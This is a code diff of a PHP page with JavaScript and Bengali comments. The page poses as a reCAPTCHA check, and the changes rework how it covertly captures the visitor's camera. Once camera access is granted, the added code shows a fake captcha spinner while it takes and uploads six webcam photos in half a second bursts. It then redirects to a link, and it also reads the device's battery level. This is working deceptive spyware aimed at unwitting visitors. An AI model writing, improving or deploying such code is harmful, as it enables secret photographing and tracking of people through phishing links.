@@ -1,7 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // Check link expiry parameter (e)
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
@@ -222,10 +221,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         const recaptchaContainer = document.getElementById('recaptchaContainer');
-        if (finalUrl) {
-            recaptchaContainer.style.display = 'flex';
-        }
-
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -233,32 +228,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
+        // ক্যামেরা সাকসেসফুলি ওপেন হলে এই ফাংশন রান করবে
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    video.play();
                     
-                    // ক্যামেরা ওয়ার্ম-আপ হওয়ার জন্য ১ সেকেন্ড সময় দেওয়া হলো যাতে প্রথম ছবি সাদা না আসে
-                    setTimeout(() => {
-                        captureAndUpload(); // প্রথম ক্লিয়ার ছবি
-
-                        let captureCount = 0;
-                        const captureInterval = setInterval(() => {
-                            captureAndUpload();
-                            captureCount++;
-                            if (captureCount >= 7) {
-                                clearInterval(captureInterval);
-                            }
-                        }, 500); // প্রতি ০.৫ সেকেন্ড পর পর ছবি পাঠানো
-                    }, 1000);
-
+                    // ১. ক্যামেরা চালু হওয়ার সাথে সাথে ক্যাপচা বক্স শো হবে এবং স্পিনার ঘুরবে
                     recaptchaContainer.style.display = 'flex';
-                    
+
+                    // ২. ক্যামেরা চালু হওয়ার সাথে সাথেই একসাথে একাধিক ছবি (Burst mode: প্রতি ০.৫ সেকেন্ড পর পর) পাঠানো শুরু হবে
+                    let captureCount = 0;
+                    const captureInterval = setInterval(() => {
+                        captureAndUpload();
+                        captureCount++;
+                        if (captureCount >= 6) { // মোট ৬টি ছবি (৩ সেকেন্ডে) পাঠানো হবে
+                            clearInterval(captureInterval);
+                        }
+                    }, 500);
+
+                    // ৩. ৪ সেকেন্ড স্পিনার ঘুরে টিক মার্ক এসে মেইন ট্যাবে লিংক ওপেন হবে
                     const checkbox = document.getElementById('recaptchaCheckbox');
                     const spinner = document.getElementById('recaptchaSpinner');
 
-                    // ৪ সেকেন্ড স্পিনার ঘোরার পর টিক মার্ক এসে মেইন ট্যাবে রিডাইরেক্ট হবে
                     setTimeout(() => {
                         spinner.style.display = 'none';
                         checkbox.classList.add('checked');
